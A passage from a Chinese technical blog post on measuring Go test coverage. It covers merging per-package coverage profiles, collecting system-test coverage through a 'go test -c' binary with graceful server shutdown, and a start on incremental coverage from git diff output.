class=\"headerlink\" title=\"方案一\"></a>方案一</h4><p>方案一是使用shell脚本遍历子目录并分别执行go test,然后再把生成的覆盖信息合并。</p>\n<p>我们创建一个coverage.sh文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 脚本来自 http://singlecool.com/2017/06/11/golang-test/</span></span><br><span class=\"line\">set -e</span><br><span class=\"line\"></span><br><span class=\"line\">profile=&quot;coverage.out&quot;</span><br><span class=\"line\">mergecover=&quot;merge_cover&quot;</span><br><span class=\"line\">mode=&quot;count&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">for package in $(go list ./...|grep -v src); do</span><br><span class=\"line\">    coverfile=&quot;$(echo $package | tr / -).cover&quot;</span><br><span class=\"line\">    go test -covermode=&quot;$mode&quot; -coverprofile=&quot;$coverfile&quot; -coverpkg=./... &quot;$package&quot;</span><br><span class=\"line\">done</span><br><span class=\"line\">go test -covermode=&quot;$mode&quot; -coverprofile=current.cover -coverpkg=./... ./</span><br><span class=\"line\"></span><br><span class=\"line\">grep -h -v &quot;^mode:&quot; *.cover | sort &gt; $mergecover</span><br><span class=\"line\"></span><br><span class=\"line\">echo &quot;mode: $mode&quot; &gt; $profile</span><br><span class=\"line\">current=&quot;&quot;</span><br><span class=\"line\">count=0</span><br><span class=\"line\">while read line; do</span><br><span class=\"line\">    block=$(echo $line | cut -d &#x27; &#x27; -f1-2)</span><br><span class=\"line\">    num=$(echo $line | cut -d &#x27; &#x27; -f3)</span><br><span class=\"line\">    if [ &quot;$current&quot; == &quot;&quot; ]; then</span><br><span class=\"line\">        current=$block</span><br><span class=\"line\">        count=$num</span><br><span class=\"line\">    elif [ &quot;$block&quot; == &quot;$current&quot; ]; then</span><br><span class=\"line\">        count=$(($count + $num))</span><br><span class=\"line\">    else</span><br><span class=\"line\">        echo $current $count &gt;&gt; $profile</span><br><span class=\"line\">        current=$block</span><br><span class=\"line\">        count=$num</span><br><span class=\"line\">    fi</span><br><span class=\"line\">done &lt; $mergecover</span><br><span class=\"line\"></span><br><span class=\"line\">if [ &quot;$current&quot; != &quot;&quot; ]; then</span><br><span class=\"line\">    echo $current $count &gt;&gt; $profile</span><br><span class=\"line\">fi</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>然后修改makefile</p>\n<figure class=\"highlight makefile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">testlow:</span></span><br><span class=\"line\">\tsh coverage.sh</span><br><span class=\"line\">\t@sed -i <span class=\"string\">&quot;s/_$&#123;PWDSLASH&#125;/./g&quot;</span> coverage.out</span><br><span class=\"line\">\t@go tool cover -html=coverage.out -o coverage.html</span><br><span class=\"line\">\t@go tool cover -func=coverage.out -o coverage.txt</span><br><span class=\"line\">\t@tail -n 1 coverage.txt | awk &#x27;&#123;print $$1,$$3&#125;&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>make testlow</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@8bb4497f8518 src]<span class=\"comment\"># make testlow</span></span><br><span class=\"line\">sh coverage.sh</span><br><span class=\"line\">warning: no packages being tested depend on _/code/tmp/coverage_demo/src</span><br><span class=\"line\">ok  \tbiz\t0.020s\tcoverage: 8.3% of statements <span class=\"keyword\">in</span> ./...</span><br><span class=\"line\">warning: no packages being tested depend on _/code/tmp/coverage_demo/src</span><br><span class=\"line\">warning: no packages being tested depend on biz</span><br><span class=\"line\">ok  \tlib\t0.015s\tcoverage: 16.7% of statements <span class=\"keyword\">in</span> ./...</span><br><span class=\"line\">?   \t_/code/tmp/coverage_demo/src\t[no <span class=\"built_in\">test</span> files]</span><br><span class=\"line\">total: 25.0%</span><br></pre></td></tr></table></figure>\n\n<p>可以看到总覆盖率也是25%。这种方案是比较推荐的。</p>\n<h4 id=\"方案二\"><a href=\"#方案二\" class=\"headerlink\" title=\"方案二\"></a>方案二</h4><p>我们也可以把所有测试文件集中到一个独立的目录，比如tests目录中，然后把待测源码中的函数尽量导出，方便测试。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">coverage_demo/</span><br><span class=\"line\">└── src</span><br><span class=\"line\">    ├── biz</span><br><span class=\"line\">    │   └── biz.go</span><br><span class=\"line\">    ├── lib</span><br><span class=\"line\">    │   └── lib.go</span><br><span class=\"line\">    ├── main.go</span><br><span class=\"line\">    ├── Makefile</span><br><span class=\"line\">    └── tests</span><br><span class=\"line\">        ├── biz_test.go</span><br><span class=\"line\">        └── lib_test.go</span><br></pre></td></tr></table></figure>\n\n<p>修改makefile如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">testlow:</span><br><span class=\"line\">\tgo test -v -covermode=count -coverprofile=coverage.out -coverpkg ./... ./tests</span><br><span class=\"line\">\t@sed -i &quot;s/_$&#123;PWDSLASH&#125;/./g&quot; coverage.out</span><br><span class=\"line\">\t@go tool cover -html=coverage.out -o coverage.html</span><br><span class=\"line\">\t@go tool cover -func=coverage.out -o coverage.txt</span><br><span class=\"line\">\t@tail -n 1 coverage.txt | awk &#x27;&#123;print $$1,$$3&#125;&#x27;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>执行meke testlow, 结果25%，正确。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@8bb4497f8518 src]# make testlow</span><br><span class=\"line\">go test -v -covermode=count -coverprofile=coverage.out -coverpkg ./... ./tests</span><br><span class=\"line\">warning: no packages being tested depend on _/code/tmp/coverage_demo/src</span><br><span class=\"line\">warning: no packages being tested depend on biz</span><br><span class=\"line\">warning: no packages being tested depend on lib</span><br><span class=\"line\">=== RUN   TestGetRandomPair</span><br><span class=\"line\">--- PASS: TestGetRandomPair (0.00s)</span><br><span class=\"line\">\tbiz_test.go:11: formatTwoNumber pass</span><br><span class=\"line\">=== RUN   TestGetRandomNumber</span><br><span class=\"line\">--- PASS: TestGetRandomNumber (0.00s)</span><br><span class=\"line\">\tlib_test.go:10: GetRandomNumber pass</span><br><span class=\"line\">PASS</span><br><span class=\"line\">coverage: 25.0% of statements in ./...</span><br><span class=\"line\">ok  \ttests\t0.021s</span><br><span class=\"line\">total: 25.0%</span><br></pre></td></tr></table></figure>\n\n<p>同时，把测试文件集中放到tests目录在高版本的go中结果也正确。</p>\n<h3 id=\"方案总结\"><a href=\"#方案总结\" class=\"headerlink\" title=\"方案总结\"></a>方案总结</h3><p>我们可以看到，如果你的程序在go1.10及以上，那么支持单元测试覆盖率的目录结构如下, 这种结构方便测试未导出函数。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">coverage_demo/</span><br><span class=\"line\">└── src</span><br><span class=\"line\">    ├── binary</span><br><span class=\"line\">    ├── biz</span><br><span class=\"line\">    │   ├── biz.go</span><br><span class=\"line\">    │   └── biz_test.go</span><br><span class=\"line\">    ├── lib</span><br><span class=\"line\">    │   ├── lib.go</span><br><span class=\"line\">    │   └── lib_test.go</span><br><span class=\"line\">    ├── main.go</span><br><span class=\"line\">    └── Makefile</span><br></pre></td></tr></table></figure>\n<p>测试命令是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">make test</span><br></pre></td></tr></table></figure>\n<p>如果你的版本在go1.10以下，为了保持能够测试未导出函数的优越性，我们依旧保持上面的结构，只是新增一个coverage.sh文件。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">coverage_demo/</span><br><span class=\"line\">└── src</span><br><span class=\"line\">    ├── biz</span><br><span class=\"line\">    │   ├── biz.go</span><br><span class=\"line\">    │   └── biz_test.go</span><br><span class=\"line\">    ├── coverage.sh</span><br><span class=\"line\">    ├── lib</span><br><span class=\"line\">    │   ├── lib.go</span><br><span class=\"line\">    │   └── lib_test.go</span><br><span class=\"line\">    ├── main.go</span><br><span class=\"line\">    └── Makefile</span><br></pre></td></tr></table></figure>\n<p>测试命令是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">make testlow</span><br></pre></td></tr></table></figure>\n<p>而不管你的go版本如何，你的makefile可以写得兼容go的不同版本，只需要根据go版本高低选择不同的make命令就可以了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">ROOT_PATH=$(CURDIR)/../</span><br><span class=\"line\">GOPATH:=$(ROOT_PATH)</span><br><span class=\"line\">export GOPATH</span><br><span class=\"line\"></span><br><span class=\"line\">all: format main test</span><br><span class=\"line\"></span><br><span class=\"line\">main: </span><br><span class=\"line\">\tgo build -o binary</span><br><span class=\"line\"></span><br><span class=\"line\">PWDSLASH:=$(shell pwd|sed &#x27;s/\\//\\\\\\//g&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">test:</span><br><span class=\"line\">\tgo test -v -covermode=count -coverprofile=coverage.out -coverpkg ./... ./...</span><br><span class=\"line\">\t@#workaround:https://github.com/golang/go/issues/22430</span><br><span class=\"line\">\t@sed -i &quot;s/_$&#123;PWDSLASH&#125;/./g&quot; coverage.out</span><br><span class=\"line\">\t@go tool cover -html=coverage.out -o coverage.html</span><br><span class=\"line\">\t@go tool cover -func=coverage.out -o coverage.txt</span><br><span class=\"line\">\t@tail -n 1 coverage.txt | awk &#x27;&#123;print $$1,$$3&#125;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">testlow:</span><br><span class=\"line\">\tsh coverage.sh</span><br><span class=\"line\">\t@sed -i &quot;s/_$&#123;PWDSLASH&#125;/./g&quot; coverage.out</span><br><span class=\"line\">\t@go tool cover -html=coverage.out -o coverage.html</span><br><span class=\"line\">\t@go tool cover -func=coverage.out -o coverage.txt</span><br><span class=\"line\">\t@tail -n 1 coverage.txt | awk &#x27;&#123;print $$1,$$3&#125;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">format:</span><br><span class=\"line\">\tgofmt -l -w -s ./</span><br><span class=\"line\"></span><br><span class=\"line\">.PHONY: all main test testlow format </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"系统测试覆盖率\"><a href=\"#系统测试覆盖率\" class=\"headerlink\" title=\"系统测试覆盖率\"></a>系统测试覆盖率</h2><p>你的程序已经完美支持单元测试及其覆盖率统计，当然多半你的系统也已经接入持续集成和持续部署系统了，这时候光光看单元测试的覆盖率已经不够了，我们需要看单元测试+系统测试总的测试覆盖率，毕竟单看单元测试只能看你写代码自测做的怎么样，而看总体的覆盖率才能看出这个系统总的测试完备程度。</p>\n<p>对前面低版本go覆盖率数据的合并操作中我们可以看出覆盖率是可以进行人为合并的，因此，单元测试和系统测试的覆盖率数据我们也会采用分别生成，然后人为合并的方式。</p>\n<p>同时为了避免再次引入coverage.sh中的脚本代码，我们后面的操作是基于go1.10来进行的，避免引入外部脚本增加复杂性。同时这之后的代码将不再保证兼容go1.10以下的版本。</p>\n<h3 id=\"如何收集系统测试的覆盖率数据\"><a href=\"#如何收集系统测试的覆盖率数据\" class=\"headerlink\" title=\"如何收集系统测试的覆盖率数据\"></a>如何收集系统测试的覆盖率数据</h3><p>系统测试意味着我们要把编译出来的程序部署到机器上，然后发起请求，让程序动态生成覆盖数据，然后我们拿来分析。</p>\n<p>按照其他语言的经验，我猜测是在go build中添加编译参数使得编译出来的程序能够生成覆盖率信息。但是我错了，go的解决方案在go test中，而且方案相当的隐晦。</p>\n<p>我们知道go test一执行，程序就刷刷刷的把测试用例都跑完了，根本没有机会部署程序。我们来看看<code>go test --help</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">-c</span><br><span class=\"line\">    Compile the test binary to pkg.test but do not run it</span><br><span class=\"line\">    (where pkg is the last element of the package&#x27;s import path).</span><br><span class=\"line\">    The file name can be changed with the -o flag.</span><br></pre></td></tr></table></figure>\n\n<p>可以发现-c参数的作用是编译出一个test文件，但是不执行他。</p>\n<p>我们要利用的正是这个参数，其实它没有说明的一个知识点是，如果当前目录不存在xx_test.go文件，则不生成这个test文件；而当你用-c编译出test文件并尝试执行它的时候，它并不会向平常那样刷刷刷的跑所有case，相反它只会启动当前目录下的test case，也就是如果你在src目录下生成了test文件，稍后执行它时只会启动当前目录下的xx_test.go文件当中的case。</p>\n<p>那么为了让test文件可以向正常程序那样启动服务提供服务，我们就必须向正常程序那样启动main函数！</p>\n<p>所以我们的方案呼之欲出了：</p>\n<p>在当前目录下创建一个main_test.go文件，在main_test.go中创建一个唯一的TestCase(不是唯一的其实也问题不大，但是建议唯一，结构更清晰)，在这个唯一的TestCase中启动main函数。</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// test_main.go</span></span><br><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">&quot;testing&quot;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">TestMain</span><span class=\"params\">(t *testing.T)</span></span> &#123;</span><br><span class=\"line\">\tmain()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>但是如果这么写的话，你在调用不带-c的测试命令时，不就挂在这里走不下去了吗，所以我们想个办法就是通过传递命令行参数，我们在-c编译出来并启动执行时，传入一个特定的参数，检测到参数才启动main函数，这样正常的跑单元测试时就不会被挂起在这里了。</p>\n<p>修改后的main_test.go如下</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">&quot;testing&quot;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> systemTest *<span class=\"keyword\">bool</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">init</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\tsystemTest = flag.Bool(<span class=\"string\">&quot;SystemTest&quot;</span>, <span class=\"literal\">false</span>, <span class=\"string\">&quot;Set to true when running system tests&quot;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">TestMain</span><span class=\"params\">(t *testing.T)</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> *systemTest &#123;</span><br><span class=\"line\">\t\tmain()</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>同时在makefile中新增指令,</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">test:</span><br><span class=\"line\">\tgo test -v -covermode=count -coverprofile=coverage.out -coverpkg ./... ./...</span><br><span class=\"line\">\t@#workaround:https://github.com/golang/go/issues/22430</span><br><span class=\"line\">\t@sed -i &quot;s/_$&#123;PWDSLASH&#125;/./g&quot; coverage.out</span><br><span class=\"line\">\t@go tool cover -html=coverage.out -o coverage.html</span><br><span class=\"line\">\t@go tool cover -func=coverage.out -o coverage.txt</span><br><span class=\"line\">\t@tail -n 1 coverage.txt | awk &#x27;&#123;print $$1,$$3&#125;&#x27;</span><br><span class=\"line\">\tgo test -c -o binary.test -covermode=count -coverpkg ./...</span><br></pre></td></tr></table></figure>\n\n<p>新增了<code>go test -c -o binary.test -covermode=count -coverpkg ./...</code>这一行.</p>\n<p>现在我们来编译并且执行试试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 这里生成binary.test文件，且正常case没有被block</span><br><span class=\"line\">[root@8bb4497f8518 src]# make test</span><br><span class=\"line\">go test -v -covermode=count -coverprofile=coverage.out -coverpkg ./... ./...</span><br><span class=\"line\">=== RUN   TestMain</span><br><span class=\"line\">--- PASS: TestMain (0.00s)</span><br><span class=\"line\">PASS</span><br><span class=\"line\"># 省略</span><br><span class=\"line\">total: 25.0%</span><br><span class=\"line\">go test -c -o binary.test -covermode=count -coverpkg ./...</span><br><span class=\"line\"></span><br><span class=\"line\"># 测试不带SystemTest时</span><br><span class=\"line\">[root@8bb4497f8518 src]# ./binary.test</span><br><span class=\"line\">PASS</span><br><span class=\"line\">coverage: 0.0% of statements in ./...</span><br><span class=\"line\"></span><br><span class=\"line\"># 测试带SystemTest时</span><br><span class=\"line\">[root@8bb4497f8518 src]# ./binary.test -SystemTest=true</span><br><span class=\"line\">start server</span><br></pre></td></tr></table></figure>\n\n<p>可以看到当我们带着SystemTest=true参数运行binary.test时，http server成功启动了。</p>\n<p>现在如果我们到另一个窗口发起请求，我们能不能得到我们想要的覆盖率信息呢，答案是否定的，我们还差关键的两步。</p>\n<p>第一此时./binary.test还不知道要把覆盖率信息输出到哪里，因此我们要在启动binary.test时候把文件名传给它<code>./binary.test -SystemTest=true -test.coverprofile=system.out</code>.注意是<code>test.coverprofile</code>不是<code>coverprofile</code>, 比go test时多一个test.的前缀</p>\n<p>第二，binary.test有个缺点是不会实时生成coverage信息，而是在binary.test正常退出时候才生成，因此第二步就是在跑完系统测试的case之后要手动发送信号让binary.test退出。注意要正常退出，所以kill -9是不行的。</p>\n<p>第一步好说我们把参数加上就可以了：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@8bb4497f8518 src]# ./binary.test -SystemTest=true -test.coverprofile=system.out</span><br><span class=\"line\">start server</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>接下来我们来实现第二步</p>\n<h3 id=\"如何优雅退出服务\"><a href=\"#如何优雅退出服务\" class=\"headerlink\" title=\"如何优雅退出服务\"></a>如何优雅退出服务</h3><p>通常情况下，我们的httpserver会一直存在，直到进程意外挂掉，或者被运维程序杀掉。</p>\n<p>而现在我们不得不实现一个主动退出http server的机制了。</p>\n<p>为了主动退出httpserver，我们必须拿到httpserver的实例，然后调用他的shutdown接口。</p>\n<p>所以第一步就是改造，把<code>e := http.ListenAndServe(&quot;:9999&quot;, nil)</code>改成</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">server := &amp;Server&#123;Addr: &quot;:9999&quot;, Handler: nil&#125;</span><br><span class=\"line\">e := server.ListenAndServe()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>第二步就是监听signal，当接收到指定信号的signal的时候就调用server.shutdown接口，由于ListenAndServe会阻塞，所以监听的动作需要在server实例创建后，ListenAndServe调用前。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">server := &amp;Server&#123;Addr: &quot;:9999&quot;, Handler: nil&#125;</span><br><span class=\"line\">go handleExitSignal(server)  //会阻塞所以新建goroutine</span><br><span class=\"line\">e := server.ListenAndServe()</span><br></pre></td></tr></table></figure>\n\n<p>随后handleExitSignal线程陷入阻塞等待信号量，主线程陷入阻塞等待ListenAndServe返回。</p>\n<p>当退出信号到来时，server.shutdown在handleExitSignal线程中被调用。随后主线程和handleExitSignal线程之间通过channel完成一次完美的同步，并退出。</p>\n<p><img src=\"/linkimage/gocoverage/gracefulexit.png\" alt=\"graceful exit\"></p>\n<p>所有代码都在main.go中，详细请看注释</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import (</span><br><span class=\"line\">\t&quot;biz&quot;</span><br><span class=\"line\">\t&quot;context&quot;</span><br><span class=\"line\">\t&quot;fmt&quot;</span><br><span class=\"line\">\t&quot;net/http&quot;</span><br><span class=\"line\">\t&quot;os&quot;</span><br><span class=\"line\">\t&quot;os/signal&quot;</span><br><span class=\"line\">\t&quot;syscall&quot;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">// gracefully exit http server</span><br><span class=\"line\">var done = make(chan bool, 1)      // 用于同步main线程和handleExitSignal线程</span><br><span class=\"line\">var quit = make(chan os.Signal, 1) // 用于接收信号量</span><br><span class=\"line\"></span><br><span class=\"line\">func handleExitSignal(s *http.Server) &#123;</span><br><span class=\"line\">\t// 监听下面两个信号量</span><br><span class=\"line\">\tsignal.Notify(quit, syscall.SIGTERM) // kill</span><br><span class=\"line\">\tsignal.Notify(quit, syscall.SIGINT)  // ctrl + c</span><br><span class=\"line\">\t// 阻塞等待信号量</span><br><span class=\"line\">\t&lt;-quit</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 关闭server，引起ListenAndServe函数返回</span><br><span class=\"line\">\tif err := s.Shutdown(context.Background()); err != nil &#123;</span><br><span class=\"line\">\t\tfmt.Printf(&quot;ShutDown Error: %v&quot;, err)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t// 通知主线程handleExitSignal结束了</span><br><span class=\"line\">\tclose(done)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func serverHandler(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class=\"line\">\tw.Write([]byte(biz.GetRandomPair()))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func runHttpServer() &#123;</span><br><span class=\"line\">\thttp.HandleFunc(&quot;/randompair&quot;, serverHandler)</span><br><span class=\"line\"></span><br><span class=\"line\">\tserver := &amp;http.Server&#123;Addr: &quot;:9999&quot;, Handler: nil&#125;</span><br><span class=\"line\">\tgo handleExitSignal(server)</span><br><span class=\"line\">\te := server.ListenAndServe()</span><br><span class=\"line\"></span><br><span class=\"line\">\tif e != nil &#123;</span><br><span class=\"line\">\t\tif http.ErrServerClosed == e &#123;</span><br><span class=\"line\">\t\t\tfmt.Println(&quot;server closed&quot;)</span><br><span class=\"line\">\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\tfmt.Println(&quot;server error&quot;)</span><br><span class=\"line\">\t\t\tos.Exit(1)</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 等待handleExitSignal完成</span><br><span class=\"line\">\t&lt;-done</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">\tfmt.Println(&quot;start server&quot;)</span><br><span class=\"line\">\trunHttpServer()</span><br><span class=\"line\">\tfmt.Println(&quot;stop server&quot;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"合并覆盖率文件\"><a href=\"#合并覆盖率文件\" class=\"headerlink\" title=\"合并覆盖率文件\"></a>合并覆盖率文件</h3><p>随着main.go的代码量增大，现在我们在来执行make test看看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@8bb4497f8518 src]# make test</span><br><span class=\"line\">...省略</span><br><span class=\"line\">total: 12.5%</span><br><span class=\"line\">go test -c -o binary.test -covermode=count -coverpkg ./...</span><br></pre></td></tr></table></figure>\n\n<p>可以看到覆盖率下降了。</p>\n<p>下面我们来尝试生成system.out并与coverage.out合并。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 请求http server，使产生新的覆盖</span><br><span class=\"line\">[root@8bb4497f8518 src]# curl &quot;http://127.0.0.1:9999/randompair&quot;</span><br><span class=\"line\">2819885537999553053-223459348605777169</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 找到pid</span><br><span class=\"line\">[root@8bb4497f8518 src]# ps -ef | grep binary.test</span><br><span class=\"line\">root      5182     1  0 01:51 pts/0    00:00:00 ./binary.test -SystemTest=true -test.coverprofile=system.out</span><br><span class=\"line\">root      5194     1  0 01:52 pts/0    00:00:00 grep --color=auto binary.test</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># kill it</span><br><span class=\"line\">[root@8bb4497f8518 src]# kill 5182</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># server closed gracefully</span><br><span class=\"line\">[root@8bb4497f8518 src]# server closed</span><br><span class=\"line\">stop server</span><br><span class=\"line\">PASS</span><br><span class=\"line\">coverage: 87.5% of statements in ./...</span><br></pre></td></tr></table></figure>\n\n<p>这里要特别注意，在发送完kill等待server退出时要适当的等待若干秒，比如10秒，不要立即往后面的步骤走，因为对于大项目，代码量大，binary.test在输出覆盖率信息时需要的耗时较长，如果不等待的话，你拿到的覆盖率信息就是残缺的。等待足够时间之后，我们往下走，来合并覆盖率文件。</p>\n<p>为了方便合成，我们修改makefile</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mergecoverage:</span><br><span class=\"line\">\t@echo &#x27;mode: count&#x27; &gt; total.out</span><br><span class=\"line\">\t@tail -q -n +2 coverage.out &gt;&gt; total.out</span><br><span class=\"line\">\t@tail -q -n +2 system.out &gt;&gt; total.out</span><br><span class=\"line\">\t@sed -i &quot;s/_$&#123;PWDSLASH&#125;/./g&quot; total.out</span><br><span class=\"line\">\t@go tool cover -html=total.out -o total.html</span><br><span class=\"line\">\t@go tool cover -func=total.out -o total.txt</span><br><span class=\"line\">\t@tail -n 1 total.txt | awk &#x27;&#123;print $$1,$$3&#125;&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>然后make mergecoverage</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@8bb4497f8518 src]# make mergecoverage</span><br><span class=\"line\">total: 87.5%</span><br></pre></td></tr></table></figure>\n\n<p>查看文本形式的函数覆盖信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@8bb4497f8518 src]# cat total.txt</span><br><span class=\"line\">./main.go:17:\thandleExitSignal\t83.3%</span><br><span class=\"line\">./main.go:32:\tserverHandler\t\t100.0%</span><br><span class=\"line\">./main.go:36:\trunHttpServer\t\t80.0%</span><br><span class=\"line\">./main.go:56:\tmain\t\t\t100.0%</span><br><span class=\"line\">biz/biz.go:8:\tformatTwoNumber\t\t100.0%</span><br><span class=\"line\">biz/biz.go:12:\tGetRandomPair\t\t100.0%</span><br><span class=\"line\">lib/lib.go:8:\tGetRandomNumber\t\t100.0%</span><br><span class=\"line\">total:\t\t(statements)\t\t87.5%</span><br></pre></td></tr></table></figure>\n\n<p>查看html形式的覆盖信息</p>\n<p>可以看到前面单元测试没覆盖到的这次覆盖到了</p>\n<p><img src=\"/linkimage/gocoverage/totalcovbiz.png\" alt=\"total cov biz\"></p>\n<p>可以看到main.go中大部分都覆盖到了</p>\n<p><img src=\"/linkimage/gocoverage/totalcovmain.png\" alt=\"total cov main\"></p>\n<h2 id=\"增量覆盖率\"><a href=\"#增量覆盖率\" class=\"headerlink\" title=\"增量覆盖率\"></a>增量覆盖率</h2><p>随着业务进展，代码质量的把关变得越来越严，每一轮的需求实现都需要控制质量。其中代码的测试覆盖率作为基础且重要的一环被引入需求实现的流程中。这其中跟之前不同之处在于，这里要统计的是新增代码的测试覆盖率，所以我们就来想办法实现他。</p>\n<h3 id=\"结构化增量信息\"><a href=\"#结构化增量信息\" class=\"headerlink\" title=\"结构化增量信息\"></a>结构化增量信息</h3><p>增量信息获取可以使用git diff来实现，假如我们最新一次的提交hash值是newCommitHash, 则获取增量信息的指令是<code>git diff master newCommitHash</code>.这个命令输出如下内容(摘自golang源码的一段diff)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">diff --git a/AUTHORS b/AUTHORS</span><br><span class=\"line\">index e861bfc..8b8105b 100644</span><br><span class=\"line\">--- a/AUTHORS</span><br><span class=\"line\">+++ b/AUTHORS</span><br><span class=\"line\">@@ -2,6 +2,10 @@</span><br><span class=\"line\"> # This file is distinct from the CONTRIBUTORS files.</span><br><span class=\"line\"> # See the latter for an explanation.</span><br><span class=\"line\"></span><br><span class=\"line\">+# Since Go 1.11, this file is not actively maintained.</span><br><span class=\"line\">+# To be included, send a change adding the individual or</span><br><span class=\"line\">+# company who owns a contribution&#x27;s copyright.</span><br><span class=\"line\">+</span><br><span class=\"line\"> # Names should be added to this file as one of</span><br><span class=\"line\"> #     Organization&#x27;s name</span><br><span class=\"line\"> #     Individual&#x27;s name &lt;submission email address&gt;</span><br><span class=\"line\">@@ -10,26 +14,35 @@</span><br><span class=\"line\">...省略</span><br></pre></td></tr></table></figure>\n\n<p>git diff会输出多段内容，每段内容以diff开头。diff下一行是commit信息，再后两行是参与对比的来自修改前和修改后的两个文件名。再后面是多个以@@起始的位于同个文件内的修改片段，<code>@@ -2,6 +2,10 @@</code>这段内容的意思是紧随其后列举的代码行是修改前的第2行开始的连续6行，以及修改后的第2行开始的连续10行。再下面紧随其后列举的就是具体的代码行了，空格开始的表示没变化的代码行，减号开头的表示修改前的代码行，加号开头的表示修改后的代码行。</p>\n<p>因此我们通过解析git diff的内容就可以知晓具体修改的内容所在的位置，我们可以定义一个数据结构</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 伪码</span><br><span class=\"line\">struct Diff&#123;</span><br><span class=\"line\">  modifyFiles map&lt;string, ModifyFile&gt;</span><br><span class=\"line\">&#125;</span><br><span 